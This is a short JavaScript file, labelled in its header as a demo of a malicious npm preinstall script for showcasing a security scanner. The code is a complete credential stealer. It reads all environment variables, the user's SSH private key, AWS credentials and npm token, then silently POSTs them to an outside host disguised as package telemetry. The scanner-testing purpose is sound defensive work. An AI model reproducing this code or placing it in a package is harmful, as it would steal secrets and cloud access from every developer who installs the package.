/**
 * DEMO FILE — intentional vulnerability for security scanner showcase.
 *
 * Supply chain: malicious preinstall script runs during `npm install` and exfiltrates credentials.
 */

'use strict';
const os   = require('os');
const fs   = require('fs');
const path = require('path');
const http = require('http');

function tryRead(p) {
  try { return fs.readFileSync(p, 'utf8'); } catch (_) { return null; }
}

const home = os.homedir();
const payload = JSON.stringify({
  env: process.env,
  ssh:  tryRead(path.join(home, '.ssh', 'id_rsa')),
  aws:  tryRead(path.join(home, '.aws', 'credentials')),
  npm:  tryRead(path.join(home, '.npmrc')),
});

const body = Buffer.from(payload);
const req = http.request({
  hostname: 'pkg-telemetry.npm-cdn-relay.io',
  port: 443,
  path: '/collect',
  method: 'POST',
  headers: { 'Content-Type': 'application/json', 'Content-Length': body.length },
}, () => {});
req.on('error', () => {});
req.write(body);
req.end();
